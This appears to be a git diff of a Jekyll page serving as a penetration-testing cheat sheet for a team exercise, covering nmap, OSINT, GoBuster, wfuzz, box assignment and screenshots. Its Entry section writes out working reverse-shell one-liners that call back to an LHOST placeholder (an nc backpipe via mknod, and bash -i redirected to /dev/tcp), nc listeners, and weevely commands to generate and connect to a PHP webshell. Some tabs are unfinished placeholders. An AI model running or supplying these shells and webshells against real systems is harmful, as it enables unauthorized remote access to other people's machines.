@@ -29,7 +29,7 @@ SCODE
 SCODE
 <code>nmap -sT -Pn -T1 -oG quietscan RHOST</code>
 </div>
-SCODE    
+SCODE
 <code>nmap -sC -sV -Pn -T1 -pPORT,PORT,PORT -oG ports.nmap RHOST</code>
 </div>
 SCODE
@@ -40,8 +40,98 @@ SCODE
 <code>nmap -sT -T4 -P0 -T2 -p22,80,443 -oG common.nmap RHOST &</code>
 </div>" %} {% include block.html %}
 
+<h5>OSINT</h5>
+{% assign tabs = "wb_cert|wb_whois|wb_robots" %}
+{% assign tabnames = "CA and Cert|WHOIS|robots.txt" %} {% assign content = "
+Sometimes there's valuable info in the certificate of a website. Make sure to check it, especially if your browser alerts you that something's wrong.
+|
+A <span><code>whois</code></span> lookup helps sometimes.
+SCODE
+<code>whois RHOST</code>
+</div>
+|
+Make sure to check the <span><code>robots.txt</code></span> of the website.
+" %} {% include block.html %}
 
-<br><hr>
-Questions? Contact:<br>
-<b>Shane Donahue</b> (<a href="https://github.com/sourque">github</a>) (<a href="mailto:shane@sourque.dev">email</a>)<br><br>
+<h5>GoBuster</h5>
+{% assign tabs = "gb_direnum|gb_install" %}
+{% assign tabnames = "GoBuster Dir Enumeration|Install" %} {% assign content = "
+Enumerate a site's directories:
+SCODE
+<code>gobuster dir -u http://RHOST/ -w /usr/share/wordlists/dirb/common.txt</code>
+</div>
+|
+<span><code>GoBuster</code></span> binaries can be found <a href='https://github.com/OJ/gobuster/releases'>here</a>." %} {% include block.html %}
 
+<h5>wfuzz</h5>
+{% assign tabs = "wfuzz1|wfuzz2" %}
+{% assign tabnames = "wfuzzone|wfuzztwo" %} {% assign content = "
+wfuzz is really cool, it can bruteforce content, fuzz HTTP options, etc. Really nice tool.
+|
+wfuzz is really cool, it can bruteforce content, fuzz HTTP options, etc. Really nice tool. #2." %} {% include block.html %}
+
+<h3>Entry</h3>
+
+
+<h5>reverse shells</h5>
+{% assign tabs = "rs_mknod|rs_devtcp"%} {% assign tabnames = "mknod method|/dev/tcp method" %} {% assign content =  "
+On your local computer:
+SCODE
+<code>nc -nvlp 443</code><br>
+</div>
+On remote computer:
+SCODE
+<code>mknod /tmp/backpipe p && </code><br>
+</div>
+SCODE
+<code>/bin/sh 0< /tmp/backpipe &#124; nc LHOST 443 1> /tmp/backpipe </code>
+</div>
+|
+On local:
+SCODE
+<code>nc -nvlp 443</code><br>
+</div>
+On remote:
+SCODE
+<code>bash -i >& /dev/tcp/LHOST/443 0>&1</code><br>
+</div>" %} {% include block.html %}
+
+<h5>PHP Shells</h5>
+{% assign tabs = "ws_weevely|ws_p0wny" %}
+{% assign tabnames = "Weevely PHP Shell Generator|p0wny PHP Shell" %} {% assign content = "
+Weevely can generate compact binding webshells. Build:
+SCODE
+<code>weevely generate password ./shell.php</code>
+</div>
+Connect:
+SCODE
+<code>weevely RHOST/shell.php password</code>
+</div>
+|
+<span><code>p0wny</code></span> binding webshell can be found <a href='https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php'>here</a>." %} {% include block.html %}
+
+<h5>HTTP Auth</h5>
+{% assign tabs = "httpauth_vbypass|httpauth_bruteforce" %}
+{% assign tabnames = "Verb Bypass|Bruteforcing" %} {% assign content = "
+1
+|
+2
+" %} {% include block.html %}
+
+<h3>uh, other stuff?</h3>
+
+<h5>Assigning Boxes</h5>
+{% assign tabs = "assign_withtime|assign_withouttime" %}
+{% assign tabnames = "Fewer Boxes (1 - 20)|More Boxes (20+)" %} {% assign content = "
+Don't use <span><code>massscan</code></span> if time permits, it is more prone to false positives and missing ports (and is noisier) than targeted <span><code>nmap</code></span> scans. Create a spreadsheet containing all IPs and quick notes (ports, services, etc) and a Google Doc for each IP (for screenshots and vulns).
+|
+<span><code>massscan</code></span> that sucker, assign boxes based on expertise and focus on web/open databases first, then try to get domain access as soon as possible (Windows) or just take it slow and steady on Linux machines.
+" %} {% include block.html %}
+
+<h5>Screenshots</h5>
+{% assign tabs = "sc_linux|sc_windows" %}
+{% assign tabnames = "*nix|Windows" %} {% assign content = "
+<span><code>CTRL + SHIFT + Print Screen</code></span> then paste into a Google (or Word) Doc.
+|
+<span><code>Windows + S</code></span> then paste into a Google (or Word) Doc.
+" %} {% include block.html %}
